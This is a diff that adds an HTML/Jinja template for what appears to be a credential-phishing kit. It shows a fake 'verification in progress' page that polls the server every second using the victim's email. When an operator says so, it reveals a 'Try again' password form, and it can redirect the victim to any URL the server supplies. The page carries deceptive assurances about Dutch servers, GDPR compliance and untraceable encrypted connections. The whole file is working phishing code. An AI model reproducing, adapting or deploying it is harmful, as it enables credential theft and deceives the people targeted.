@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inscription</title>
+    <style>
+
+
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .form-container {
+        background-color: white;
+        width: 350px;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        text-align: center;
+    }
+
+    .form-container h1 {
+        margin-bottom: 20px;
+        margin-right: 10px;
+        font-size: 24px;
+        color: #333;
+    }
+
+    .container {
+        display: flex;
+        align-items: center; /* Aligne l'élément loader avec le texte */
+        justify-content:center;
+    }
+
+
+    /* Style pour chaque champ de formulaire */
+    .form-container form {
+        text-align: left;
+    }
+
+    .form-container label {
+        display: inline-block; /* Aligner les labels à gauche */
+        width: 100%; /* Laisser le label prendre toute la largeur de la ligne */
+        margin-bottom: 5px;
+        font-size: 14px;
+        text-align: left;
+        color: #333;
+    }
+
+    .form-container input[type="email"],
+    .form-container input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin: 5px 0 15px 0; /* Espacement entre les champs */
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 14px;
+    }
+
+    .form-container button {
+        width: 100%;
+        padding: 10px;
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        cursor: pointer;
+    }
+
+    .form-container button:hover {
+        background-color: #45a049;
+    }
+
+    .form-container .error {
+        color: red;
+        margin-bottom: 10px;
+    }
+
+    .form-container p {
+        margin-top: 20px;
+        font-size: 14px;
+    }
+
+    .form-container p a {
+        color: #4CAF50;
+        text-decoration: none;
+    }
+
+    .form-container p a:hover {
+        text-decoration: underline;
+    }
+    /* Le loader */
+    .loader {
+        position:absolute;
+        top:15px;
+        right:15px;
+        border: 5px solid #f3f3f3; /* Couleur de fond */
+        border-top: 5px solid #3498db; /* Couleur de la partie en mouvement */
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s ease-in-out infinite;
+    }
+
+    /* Animation de rotation */
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <div class="loader"></div>
+    <h1 id="message">Loading...</h1>
+    <img src="{{ url_for('static', filename='verif.gif') }}" alt="My Image">
+    <!-- Formulaire d'inscription -->
+    <form id="password-form" action="{{ url_for('target.verif') }}" method="POST" style="display: none;">
+        <!-- Hidden field for email -->
+        <input type="hidden" id="email-input" name="email">
+
+        <div>
+            <label for="password">Try again :</label>
+            <input type="password" id="password" name="password" placeholder="Enter password..." required>
+        </div>
+        <div>
+            <button type="submit">Submit</button>
+        </div>
+    </form>
+    <p style="text-align: justify;">
+        Your email is currently under verification for a secure connection from our
+        <a onclick="disableLink(event)" href="{{ url_for('target.verif') }}">servers based in the Netherlands.</a>
+        This process may take some time.
+    </p>
+</div>
+
+
+<script>
+    // Function to fetch and update the message
+    function fetchAndUpdateMessage(email) {
+        fetch(`/user/message?email=${encodeURIComponent(email)}`)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Failed to fetch message");
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.message) {
+                    if (data.message === "Try again...") {
+                        const form = document.getElementById("password-form");
+                        form.style.display = "block"; // Make form visible
+                    } else {
+                        document.getElementById("message").textContent = data.message;
+                    }
+                } else {
+                    console.error("No message found in the response");
+                }
+            })
+            .catch(error => {
+                console.error("Error fetching message:", error);
+            });
+    }
+
+function checkAndRedirect(email){
+fetch(`/user/redirect?email=${encodeURIComponent(email)}`)
+    .then(response => {
+        if (!response.ok) {
+            throw new Error("Failed to fetch redirection URL");
+        }
+        return response.json();
+    })
+    .then(data => {
+        if (data && data.redirect_url) {
+            let redirectUrl = data.redirect_url;
+
+            // Vérifier si l'URL commence par http:// ou https://
+            if (!redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
+                // Si l'URL ne commence pas par http:// ou https://, ajouter https:// par défaut
+                redirectUrl = 'https://' + redirectUrl;
+            }
+
+            // Vérifier si l'URL est maintenant valide
+            if (redirectUrl.startsWith('http://') || redirectUrl.startsWith('https://')) {
+                // Rediriger l'utilisateur
+                window.location.href = redirectUrl;
+            } else {
+                console.error("Invalid redirection URL:", redirectUrl);
+            }
+        } else {
+            console.error("No redirection URL found in the response");
+        }
+    })
+    .catch(error => {
+        console.error("Error fetching redirection URL:", error);
+    });
+
+}
+
+// On page load, retrieve email from the URL and set up the form
+document.addEventListener("DOMContentLoaded", () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get("email");
+
+    if (email) {
+        // Set the email in the hidden input field
+        document.getElementById("email-input").value = email;
+
+        setInterval(() => {
+            fetchAndUpdateMessage(email);
+            checkAndRedirect(email);
+        }, 1000);
+
+
+    } else {
+        console.error("No email found in the URL");
+    }
+});
+
+// Function to disable the link and show an alert
+function disableLink(event) {
+    event.preventDefault(); // Prevent default link behavior
+    alert("We use servers in the Netherlands because the country has some of the strictest data protection and privacy laws in the world, including compliance with the EU's General Data Protection Regulation (GDPR). This ensures that your data is protected and handled with the highest level of security, preventing unauthorized access and ensuring your sensitive information remains safe. We use secure, encrypted connections to ensure that no one can trace or intercept your data during this process. Please be patient while we complete the verification. This process may take some time, depending on network conditions.");
+}
+
+</script>
+
+</body>
+</html>
